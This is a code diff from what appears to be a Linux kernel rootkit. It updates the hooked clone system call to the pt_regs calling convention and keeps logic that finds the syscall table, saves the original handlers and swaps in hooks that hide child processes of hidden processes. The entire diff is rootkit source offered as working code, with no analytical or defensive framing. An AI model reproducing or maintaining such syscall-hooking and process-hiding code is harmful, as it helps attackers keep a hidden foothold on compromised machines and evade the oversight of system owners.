@@ -10,7 +10,7 @@ static unsigned long *syscall_table;
 
 typedef asmlinkage long (*sys_call_stub)(const struct pt_regs *);
 
-asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
+sys_call_stub orig_clone;
 sys_call_stub orig_fork;
 sys_call_stub orig_vfork;
 sys_call_stub orig_exit;
@@ -146,9 +146,10 @@ asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
 
 /* Process management */
 
-asmlinkage long rk_clone(unsigned long a, unsigned long b, int __user *c, unsigned long d, int __user *e)
+// asmlinkage long(*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *)
+asmlinkage long rk_clone(const struct pt_regs *pt_regs)
 {
-    long i = orig_clone(a, b, c, d, e);
+    long i = orig_clone(pt_regs);
     if (is_hidden_proc(current->pid) && i != -1)
         hide_proc(i);
     // FM_INFO("clone from %d to %ld\n", current->pid, i);
@@ -201,7 +202,7 @@ int sys_call_init(void)
     syscall_table = find_syscall_table();
     FM_INFO("Found syscall_table at %lx\n", *syscall_table);
 
-    orig_clone = (asmlinkage long (*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *_))syscall_table[__NR_clone];
+    orig_clone = (sys_call_stub)syscall_table[__NR_clone];
     orig_fork = (sys_call_stub)syscall_table[__NR_fork];
     orig_vfork = (sys_call_stub)syscall_table[__NR_vfork];
     orig_exit = (sys_call_stub)syscall_table[__NR_exit];
